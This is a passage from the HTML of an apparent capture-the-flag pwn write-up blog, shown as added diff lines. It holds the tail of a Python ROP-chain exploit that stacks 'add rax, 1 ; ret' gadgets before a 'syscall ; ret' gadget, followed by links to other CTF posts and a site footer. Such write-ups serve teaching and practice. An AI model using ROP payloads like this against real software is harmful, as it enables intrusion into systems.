+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000467920<!-- raw HTML omitted -->) <!-- raw HTML omitted --># add rax, 1 ; ret<!-- raw HTML omitted -->
+p <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> pack(<!-- raw HTML omitted -->&rsquo;&lt;Q'<!-- raw HTML omitted -->, <!-- raw HTML omitted -->0x0000000000468475<!-- raw HTML omitted -->) <!-- raw HTML omitted --># syscall ; ret<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> p
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="rhamaa.github.io/post/2017-11-06-cyber-jawara-2017-final-pwn200/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Cyber Jawara 2017 Final - echo (pwn 200)</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="rhamaa.github.io/post/2018-02-25-easyivctf-2018/">
+                  <span class="button__text">EasyCTF IV 2018 - Reversing</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="rhamaa.github.io/assets/main.js"></script>
+<script src="rhamaa.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
